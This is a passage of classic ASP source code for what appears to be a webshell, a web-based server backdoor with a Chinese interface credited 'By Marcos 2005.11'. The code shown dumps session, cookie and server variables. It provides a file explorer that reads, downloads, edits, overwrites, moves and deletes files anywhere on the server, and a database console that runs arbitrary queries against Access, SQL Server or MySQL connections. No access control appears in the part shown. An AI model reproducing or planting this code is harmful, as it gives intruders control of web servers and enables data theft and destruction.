If Err<>-2147221005 Then
x=x&"|√"&Y(Err=-2147221005,"<font color=#666666>(权限不足)</font>","")&"|"
x=x&oTmp.Version
Else
x=x&"|<font color=red>×</font>|"
End If
If Err Then Err.Clear
Set oTmp=Nothing
tObj=Split(x,"|")
tObj(1)=tObj(0)&Y(tObj(1)<>""," <font color=#666666>("&tObj(1)&")</font>","")
%>
<tr>
<%
O "<td>&nbsp;"&tObj(1)&"</td>"
O "<td align=center>"&tObj(2)&"</td>"
O "<td align=center>"&tObj(3)&"</td>"
%>
</tr>
<%
Next
O "<form method=post action='"&url&"'>"
%><input type=hidden name=G value=PageCheck><input type=hidden name=N id=N>
<tr>
<td colspan=3>&nbsp;其它组件检测:
<%
O "<input name=TheObj type=text id=TheObj style='width:585px;' value="""&sObj&""">"
%><input type=submit name=Submit value=提交></td>
</tr>
</form>
<%
O Replace(Q,"=2","=3")
End Sub
Sub PageCSInfo()
If B=False Then On Error Resume Next
Dim sKey,sVar,sVariable
ST("客户端服务器交互信息")
O Replace(K,"{$s}","Application 变量查看")
For Each sVariable In Application.Contents
%>
<tr><td valign=top style='width:130px;'>
<%
O "&nbsp;<span class=fixSpan style='width:130px;' title='"&sVariable&"'>"&sVariable&"</span>"
%>
</td><td style='padding-left:7px;' class=fixTable><span>
<%
If IsArray(Application(sVariable))=True Then
For Each sVar In Application(sVariable)
O "<div>"&StrEncode(sVar)&"</div>"
Next
 Else
O StrEncode(Application(sVariable))
End If
%>
</span></td></tr>
<%
Next
O Q
O "<br>"&Replace(K,"{$s}","Session 变量查看")
For Each sVariable In Session.Contents
%>
<tr><td valign=top style='width:130px;'>
<%
O "&nbsp;<span class=fixSpan style='width:130px;' title='"&sVariable&"'>"&sVariable&"</span>"
%>
</td><td style='padding-left:7px;' class=fixTable><span>
<%
O StrEncode(Session(sVariable))
%>
</span></td></tr>
<%
Next
O Q
O "<br>"&Replace(K,"{$s}","Cookies 变量查看")
For Each sVariable In Request.Cookies
If Request.Cookies(sVariable).HasKeys Then
For Each sKey In Request.Cookies(sVariable)
%>
<tr><td valign=top style='width:130px;'>
<%
O "&nbsp;<span class=fixSpan style='width:130px;' title='"&sVariable&"'>"&sVariable&"("&sKey&")</span>"
%>
</td><td style='padding-left:7px;' class=fixTable><span>
<%
O StrEncode(Request.Cookies(sVariable)(sKey))
%>
</span></td></tr>
<%
Next
 Else
O "<tr><td valign=top style='width:130px;'>&nbsp;<span class=fixSpan style='width:130px;' title='"&sVariable&"'>"&sVariable&"</span></td><td style='padding-left:7px;'>"&StrEncode(Request.Cookies(sVariable))&"</td></tr>"
End If
Next
O Q
O "<br>"&Replace(K,"{$s}","ServerVariables 变量查看")
For Each sVariable In Request.ServerVariables
O "<tr><td>&nbsp;"&sVariable&":</td><td style='padding-left:7px;' class=fixTable>"&StrEncode(Request.ServerVariables(sVariable))&"</li>"
Next
O Q
End Sub
Sub PageFso()
ST("FSO文件浏览操作器")
Select Case N
Case "rename"
RenOne()
Case "download"
DownTheFile()
Response.End()
Case "del"
DelOne()
Case "newone"
NewOne()
Case "saveas"
SaveAs()
Case "save"
SaveToFile()
ShowEdit()
Response.End()
Case "showedit"
ShowEdit()
Response.End()
Case "showimage"
ShowImage()
Response.End()
Case "copy","move"
MoveCopyOne()
End Select
If N<>"" Then P=R("truePath")
FsoFileExplorer()
End Sub
Sub FsoFileExplorer()
Dim oX,tFolder,folderId,extName,parentFolderName
Dim sPath
If B=False Then On Error Resume Next
If P="" Then P=RP
sPath=P
If F.FolderExists(sPath)=False Then
ShowErr(P&" 目录不存在或者不允许访问!")
End If
Set tFolder=F.GetFolder(sPath)
parentFolderName=F.GetParentFolderName(sPath)&"\"
O "<form method=post action='"&url&"'>"
O Replace(K,"{$s}","FSO文件浏览操作器")
%>
<td colspan=2>&nbsp;
<%
O "路径: <input style='width:500px;' name=P value="""&C(P)&""">"
O "<input type=hidden name=truePath value="""&C(P)&""">"
%>
 <input type=button value='提交' onclick=Command('submit');>
 <input type=button value=上传 onclick=Command('upload')>
</td>
</tr>
<tr><td colspan=2 class=trHead>&nbsp;</td></tr>
<tr><td valign=top><input type=hidden name=N><input type=hidden name=param><input type=hidden value=PageFso name=G>
<table width='99%' align=center>
<tr><td colspan=4 class=trHead>&nbsp;</td></tr><tr class=td><td>
<%
If parentFolderName<>"\" Then
folderId=Replace(parentFolderName,"\","\\")
O "&nbsp;<a href=""javascript:changeThePath(&#34;"&folderId&"&#34;);"">↑回上级目录</a>"
End If
%>
</td><td align=center width=80>大小</td>
<td align=center width=140>最后修改</td><td align=center>操作</td></tr>
<%
For Each oX In tFolder.SubFolders
folderId=Replace(oX.Path,"\","\\")
O "<tr title="""&oX.Name&"""><td>&nbsp;<font color=CCCCFF>■</font>"
%>
<span class=fixSpan style='width:180;'>
<%
O "<a href=""javascript:changeThePath(&#34;"&folderId&"&#34;);"">"& oX.Name&"</a></span>"
%>
</td>
<td align=center>-</td>
<%
O "<td align=center>"&oX.DateLastModified&"</td><td>"
O "<input type=checkbox name=checkBox value="""&oX.Name&""">"
O "<input type=button onclick=""Command('rename',&#34;"&oX.Name&"&#34;);"" value='Ren' title=重命名>"
O "<input type=button value='SaveAs' title=另存为 onclick=""Command('saveas',&#34;"&Replace(oX.Path,"\","\\")&"&#34;)"">"
%>
</td></tr>
<%
Next
For Each oX In tFolder.Files
If Left(oX.Path,Len(RP))<>RP Then
folderId=""
 Else
folderId=Replace(Replace(U(Mid(oX.Path,Len(RP)+1)),"%2E","."),"+","%20")
End If
O "<tr title="""&oX.Name&"""><td>&nbsp;<font color=CCCCFF>□</font>"
%>
<span class=fixSpan style='width:180;'>
<%
If folderId="" Then
O oX.Name
 Else
O "<a href='"&Replace(folderId,"%5C","/")&"' target=_blank>"&oX.Name&"</a>"
End If
O "</span></td><td align=center>"&GetTheSize(oX.Size)&"</td>"
O "<td align=center>"&oX.DateLastModified&"</td><td>"
O "<input type=checkbox name=checkBox value="""&oX.Name&""">"
extName=LCase(F.GetExtensionName(oX.Path))
'If InStr(EF,"$"&extName&"$")>0 Then'让所有文件有编辑功能
O "<input type=button value='Edit' title=编辑 onclick=""Command('showedit',&#34;"&oX.Name&"&#34;);"">"
'End If
If InStr(FE,"$"&extName&"$")>0 Then
O "<input type=button value='View' title=查看图片 onclick=""Command('showimage',&#34;"&oX.Name&"&#34;);"">"
End If
If extName="mdb" Then
O "<input type=button value='Access' title=数据库操作 onclick=Command('access',"""&oX.Name&""")>"
End If
O "<input type=button value='D' title=下载 onclick=""Command('download',&#34;"&oX.Name&"&#34;)"">"
O "<input type=button value='Ren' title=重命名 onclick=""Command('rename',&#34;"&oX.Name&"&#34;)"">"
O "<input type=button value='S' title=另存为 onclick=""Command('saveas',&#34;"&Replace(oX.Path,"\","\\")&"&#34;)"">"
%>
</td></tr>
<%
Next
%>
<tr class=td><td colspan=3></td>
<td><input type=checkbox name=checkAll onclick=checkAllBox(this);><input type=button value='Delete' onclick=Command('del')><input type=button value='Pack' title=打包选中文件(夹) onclick=Command('pack')>
</td></tr></table>
</td><td width='20%' valign=top align=center><input type=button value=刷新 onclick=this.form.P.value=this.form.truePath.value;Command('submit');><br><input type=button value=新建文件 onclick=Command('newone','file')><br><input type=button value=新建文件夹 onclick=Command('newone','folder')><hr style='color:#d8d8f0;'/>
<%
O "移动选中文件(夹)到<br><input value="""&C(P)&""" name=MoveTo><br><input type=button value='移动' onclick=Command('move');><hr style='color:#d8d8f0;'/>"
O "复制选中文件(夹)到<br><input value="""&C(P)&""" name=CopyTo><br><input type=button value='复制' onclick=Command('copy');><hr style='color:#d8d8f0;'/>"
%>
</td></tr>
<%=Q%>
</form>
<%
Set tFolder=Nothing
End Sub
Sub RenOne()
Dim oX,sPath,aParam,isFile,isFolder
If B=False Then On Error Resume Next
aParam=Split(R("param"),",")
sPath=R("truePath")&"\"
aParam(0)=sPath&aParam(0)
isFile=F.FileExists(aParam(0))
isFolder=F.FolderExists(aParam(0))
If isFile=False And isFolder=False Then
ShowErr("文件(夹)不存在或者不允许访问!")
End If
If isFile=False Then
Set oX=F.GetFolder(aParam(0))
oX.Name=aParam(1)
 Else
Set oX=F.GetFile(aParam(0))
oX.Name=aParam(1)
End If
Set oX=Nothing
ChkErr(Err)
End Sub
Sub DownTheFile()
Response.Clear
Dim M,sPath
If B=False Then On Error Resume Next
sPath=R("truePath")&"\"&R("param")
Set M=Server.CreateObject("adodb.Stream")
M.Open
M.Type=1
M.LoadFromFile(sPath)
ChkErr(Err)
Response.AddHeader "Content-Disposition","Attachment;Filename="&R("param")
Response.AddHeader "Content-Length",M.Size
Response.Charset="UTF-8"
Response.ContentType="Application/Octet-Stream"
Response.BinaryWrite M.Read 
Response.Flush
M.Close
Set M=Nothing
End Sub
Sub DelOne()
Dim oX,sPath
If B=False Then On Error Resume Next
sPath=R("truePath")&"\"
For Each oX In Request.Form("checkBox")
If F.FolderExists(sPath&oX)=True Then
Call F.DeleteFolder(sPath&oX,True)
ChkErr(Err)
Else
If F.FileExists(sPath&oX)=True Then
Call F.DeleteFile(sPath&oX,True)
ChkErr(Err)
End If
End If
Next
End Sub
Sub MoveCopyOne()
Dim oX,sPath,sMoveTo,sCopyTo
If B=False Then On Error Resume Next
sMoveTo=R("MoveTo")
sCopyTo=R("CopyTo")
sPath=R("truePath")&"\"
If N="move" Then
sMoveTo=sMoveTo&"\"
 Else
sCopyTo=sCopyTo&"\"
End If
For Each oX In Request.Form("checkBox")
If N="move" Then
If InStr(sMoveTo,sPath&oX)>0 Then
ShowErr("目标文件夹不能在源文件夹内")
End If
If F.FileExists(sPath&oX)=True Then
Call F.MoveFile(sPath&oX,sMoveTo&oX)
 Else
Call F.MoveFolder(sPath&oX,sMoveTo&oX)
End If
 Else
If InStr(sCopyTo,sPath&oX)>0 Then
ShowErr("目标文件夹不能在源文件夹内")
End If
If F.FileExists(sPath&oX)=True Then
Call F.CopyFile(sPath&oX,sCopyTo&oX)
 Else
Call F.CopyFolder(sPath&oX,sCopyTo&oX)
End If
End If
ChkErr(Err)
Next
End Sub
Sub NewOne()
Dim oX,sPath,aParam
If B=False Then On Error Resume Next
aParam=Split(R("param"),",")
sPath=R("truePath")&"\"&aParam(0)
If aParam(1)="file" Then
Call F.CreateTextFile(sPath,False)
 Else
F.CreateFolder(sPath)
End If
End Sub
Sub ShowEdit()
Dim tFile,sPath
If B=False Then On Error Resume Next
sPath=R("truePath")&"\"&R("param")
If Right(sPath,1)="\" Then sPath=Left(sPath,Len(sPath) - 1)
Set tFile=F.OpenTextFile(sPath,1,False)
ChkErr(Err)
O "<form method=post action="&url&">"
O Replace(Replace(K,"{$s}","FSO文本编辑器"),"=2","=1")
%><input type=hidden name=N><input type=hidden value=PageFso name=G>
<tr>
<%
O "<td height=22>&nbsp;<input name=truePath value="""&sPath&""" style=width:500px;>"
%><input type=submit value=查看 onClick=this.form.N.value='showedit';></td>
</tr>
<tr>
<td>&nbsp;<textarea name=fileContent style='width:735px;height:500px;'>
<%
O C(tFile.ReadAll())
%></textarea></td>
</tr>
<tr>
<td class=trHead>&nbsp;</td>
</tr>
<tr>
<td class=td align=center><input type=button name=Submit value=保存 onClick="if(confirm('确认保存修改?')){this.form.N.value='save';this.form.submit();}"><input type=reset value=重置><input type=button onclick='window.close();' value=关闭><input type=button value=预览 onclick=preView('1');title='以HTML方式在新窗口中预览当前代码'></td>
</tr>
</form>
</table>
<%
Set tFile=Nothing
End Sub
Sub SaveToFile()
Dim tFile,sPath,fileContent
If B=False Then On Error Resume Next
fileContent=R("fileContent")
sPath=R("truePath")
Set tFile=F.OpenTextFile(sPath,2,True)
tFile.Write fileContent
tFile.Close
ChkErr(Err)
Set tFile=Nothing
End Sub
Sub SaveAs()
Dim sPath,aParam,isFile
If B=False Then On Error Resume Next
aParam=Split(R("param"),",")
aParam(0)=aParam(0)
aParam(1)=aParam(1)
isFile=F.FileExists(aParam(0))
If isFile=True Then
F.CopyFile aParam(0),aParam(1),False
 Else
F.CopyFolder aParam(0),aParam(1),False
End If
ChkErr(Err)
End Sub
Sub ShowImage()
Dim M,sPath,fileContentType
If B=False Then On Error Resume Next
sPath=R("truePath")&"\"&R("param")
Set M=Server.CreateObject("adodb.Stream")
M.Open
M.Type=1
M.LoadFromFile(sPath)
ChkErr(Err)
Response.Clear
Response.BinaryWrite M.Read 
M.Close
Set M=Nothing
End Sub
Sub PageDBTool()
ST("Access+SQL Server 数据库操作")
O "<form method=post action="""&url&""">"
If N<>"" And N<>"Query" And N<>"ShowTables" Then
SqlShowEdit()
%>
</form>
<%
Response.End()
End If
ShowDBTool()
Select Case N
Case "Query"
ShowQuery()
Case "ShowTables"
ShowTables()
End Select
%>
</form>
<%
End Sub
Sub ShowDBTool()
%><input type=hidden value=PageDBTool name=G><input type=hidden name=N><input type=hidden name=param>
<%
O Replace(K,"{$s}","Access+SQL Server 数据库操作")
%>
<tr>
<td height=50 align=center colspan=2><select onchange="this.form.P.value=this.value;this.value='';"><option value=''>模板选择
<option value='DataSource;UserName;PassWord;'>MDB(1)
<%
O "<option value='sql:Provider=Microsoft.Jet.OLEDB.4.0;Data Source="&RP&"\db.mdb'>MDB(2)"
%>
<option value='sql:Provider=SQLOLEDB.1;Server=(local);User ID=UserName;Password=***;Database=Pubs;'>SQL Server
<option value='sql:Driver={MySql};Server=127.0.0.1;Port=3306;Database=DbName;UId=root;Pwd=***;'>MySQL Server
<option value='sql:Dsn=DsnName;'>数据源
</select> 
<%
O "<input name=P type=text id=P value="""&C(P)&""" size=60>"
%>
</td>
</tr>
<tr>
<td class=trHead>&nbsp;</td>
</tr>
<tr>
<td align=center class=td><input type=submit name=Submit value='提 交' onclick="this.form.N.value='ShowTables';"><input type=reset value='重 置'> 
</td>
</tr>
</table>
<%
End Sub
Sub ShowTables()
Dim Cat,oTable,oColumn,iColSpan,oSchema
If B=False Then On Error Resume Next
O sSqlSelect&"<textarea name=sql rows=1 style='width:647px;'></textarea>"
%>
 <input type=button value=执行查询 onclick="this.form.N.value='ShowQuery';Command('Query','0');"><input type=button value=- onclick='if(this.form.sql.rows>3)this.form.sql.rows-=3;'><input type=button value=+ onclick='this.form.sql.rows+=3;'>
<br>
<%
O Replace(K,"{$s}","数据表及结构查看")
CreateConn()
Set Cat=Server.CreateObject("ADOX.Catalog")
Cat.ActiveConnection=conn.ConnectionString
%>
<tr><td width='20%' valign=top>
<%
For Each oTable In Cat.Tables
O "<span class=fixSpan title='"&oTable.Name&"' onclick=""Command('Query',this.title);this.disabled=true;"" "
O "style='width:94%;padding-left:8px;cursor:hand;'>"&oTable.Name&"</span>"
Next
%>
</td><td>
<%
iColSpan=Y(isSqlServer=True,"4","6")
For Each oTable In Cat.Tables
%>
<table width=98% align=center>
<tr>
<%
O "<td class=trHead colspan="&iColSpan&">&nbsp;</td>"
%>
</tr>
<tr>
<%
O "<td colspan="&iColSpan&" class=td>&nbsp;<b>"
O oTable.Name&"</b></td>"
%>
</tr>
<%
%>
<tr align=center>
<td align=left width=*>&nbsp;列名</td>
<td width=80>类型</td>
<td width=60>大小</td>
<td width=60>可否为空</td>
<%
If isSqlServer=False Then
%>
<td width=50>默认值</td>
<td width=100>描述</td>
<%
End If
%>
</tr>
<%
For Each oColumn In Cat.Tables(oTable.Name).Columns
%>
<tr align=center>
<%
O "<td align=left><span style='width:98%;padding-left:5px;'>"&oColumn.Name&"</a></td>"
O "<td>"&GetDataType(oColumn.Type)&"</td>"
If oColumn.DefinedSize<>0 Then
O "<td>"&oColumn.DefinedSize&"</td>"
 Else
O "<td>"&Y(oColumn.Precision<>0,oColumn.Precision,"&nbsp;")&"</td>"
End If
O "<td>"&Y(oColumn.Attributes=1,"False","True")&"</td>"
If isSqlServer=False Then
O "<td><span class=fixSpan style='width:40px;padding-left:5px;' title="""&C(oColumn.Properties("Default").value)&""">"
O C(oColumn.Properties("Default").value)&"</span></td>"
O "<td align=left><span class=fixSpan style='width:95px;padding-left:5px;' title="""&oColumn.Properties("Description")&""">"
O oColumn.Properties("Description")&"</span></td>"
End If
%>
</tr>
<%
Next
%>
<tr>
<%
O "<td colspan="&iColSpan&" class=td>&nbsp;</td>"
%>
</tr>
</table><br>
<%
Next
%>
</td>
</tr>
<%
%>
<tr>
<td colspan=2 class=trHead>&nbsp;</td>
</tr>
<tr>
<td colspan=2 class=td align=right>By Marcos 2005.11&nbsp;</td>
</tr>
</table>
<%
Set Cat=Nothing
DestoryConn()
End Sub
Sub ShowQuery()
Dim i,j,x,rs,sql,sqlB,sqlC,Cat,iPage,oTable,sParam,sTable,sPrimaKey,sExec
If B=False Then On Error Resume Next
sql=R("sql")
sParam=R("param")
sTable=R("tTable")
Set rs=Server.CreateObject("Adodb.RecordSet")
If IsNumeric(sParam)=True Then
iPage=sParam
 Else
iPage=1
sTable=sParam
sql=""
End If
If sql="" Then
sql="Select * From ["&sTable&"]"
End If
For i=1 To Request.Form("KeyWord").Count
If Request.Form("KeyWord")(i)<>"" Then
sqlC=Replace(Request.Form("KeyWord")(i),"'","''")
sqlC=Y(Request.Form("JoinTag")(i)=" like ","'"&sqlC&"'",sqlC)
sqlB=sqlB&"["&Request.Form("Fields")(i)&"]"&Request.Form("JoinTag")(i)&sqlC&Request.Form("JoinTag2")(i)
End If
Next
If sqlB<>"" Then
sql="Select * From ["&sTable&"] Where "&sqlB
If Right(sql,4)=" Or " Then sql=Left(sql,Len(sql) - 4)
If Right(sql,5)=" And " Then sql=Left(sql,Len(sql) - 5)
End If
O sSqlSelect&"<input type=hidden name=sql value="""&C(sql)&""">"
O "<textarea name=sqlB rows=1 style='width:647px;'>"&C(sql)&"</textarea>"
%>
 <input type=button value=执行查询 onclick="this.form.sql.value=this.form.sqlB.value;Command('Query','0');"><input type=button value=- onclick='if(this.form.sqlB.rows>3)this.form.sqlB.rows-=3;'><input type=button value=+ onclick='this.form.sqlB.rows+=3;'>
<%
O "<input type=hidden name=tTable value="""&C(sTable)&""">"
%>
<br>
<%
O Replace(K,"{$s}","SQL查询器")
CreateConn()
Set Cat=Server.CreateObject("ADOX.Catalog")
Cat.ActiveConnection=conn.ConnectionString
%>
<tr><td width='20%' valign=top>
<%
For Each oTable In Cat.Tables
O "<span class=fixSpan title='"&oTable.Name&"' onclick=""Command('Query',this.title);this.disabled=true;"" "
%>
style='width:94%;padding-left:8px;cursor:hand;'>
<%
If sTable=oTable.Name Then
O "<u>"&oTable.Name&"</u>"
 Else
O oTable.Name
End If
%>
</span>
<%
Next
%>
</td><td valign=top>
<%
If LCase(Left(sql,7))="select " Then
rs.Open sql,conn,1,1
ChkErr(Err)
rs.PageSize=PageSize
If Not rs.Eof Then
rs.AbsolutePage=iPage
End If
%>
<div align=left><table border=1 width=490>
<tr>
<td height=22 class=trHead>&nbsp;</td>
</tr>
<tr>
<td height=22 class=td width=100>&nbsp;查询</td>
</tr><tr><td align=center>
<div><select name=Fields>
<%
For Each x In rs.Fields
O "<option value="""&x.Name&""">"&x.Name&"</option>"
Next
%>
</select><select name=JoinTag><option value=' like '>like</option><option value='='>=</option></select><input name=KeyWord style='width:200px;'><select name=JoinTag2><option value=' And '>And</option><option value=' Or '>Or</option></select> <input type=button value=+ onclick="this.parentElement.outerHTML+='<div>'+this.parentElement.innerHTML+'</div>';"><input type=button value=- onclick="this.parentElement.outerHTML='';"></div> <input type=button value=查询 onclick=this.form.sql.value='';this.form.param.value='1';this.form.N.value='Query';this.form.submit();>
</td></tr>
<tr><td class=td>&nbsp;</td></tr>
</table></div><br>
<%
If rs.Fields.Count>0 Then
sPrimaKey=GetPrimaKey(sTable)
%>
<table border=1 align=left cellpadding=0 cellspacing=0>
<tr>
<%
O "<td height=22 class=trHead colspan="&rs.Fields.Count+1&">&nbsp;</td>"
%>
</tr>
<tr>
<td height=22 class=td width=100 align=center>操作</td>
<%
For j=0 To rs.Fields.Count - 1
O "<td height=22 class=td width=130><span class=fixSpan title='"&rs.Fields(j).Name&"' style='width:125px;padding-left:5px;'>"&rs.Fields(j).Name&"</span></td>"
Next
For i=1 To rs.PageSize
If rs.Eof Then Exit For
%>
</tr>
<tr valign=top>
<td height=22 align=center>
<%
If sPrimaKey<>"" Then
O "<input type=button value=编辑 title='编辑/添加' onclick=showSqlEdit('"&sPrimaKey&"','"&rs(sPrimaKey)&"');>"
O "<input type=button value=删除 onclick=sqlDelete('"&sPrimaKey&"','"&rs(sPrimaKey)&"');></td>"
 Else
O "<input type=button value=编辑 title='编辑/添加' onclick=alert('主键不存在,操作有可能导致重大数据库灾难,并且该操作不可逆!');showSqlEdit('"&rs.Fields(0).Name&"','"&rs(rs.Fields(0).Name)&"');>"
O "<input type=button value=删除 onclick=alert('主键不存在,操作有可能导致重大数据库灾难,并且该操作不可逆!');sqlDelete('"&rs.Fields(0).Name&"','"&rs(rs.Fields(0).Name)&"');></td>"
End If
For j=0 To rs.Fields.Count - 1
O "<td height=22><span class=fixSpan style='width:125px;padding-left:5px;'>"&C(Y(Len(rs(j))>50,Left(rs(j),50),rs(j)))&"</span></td> 
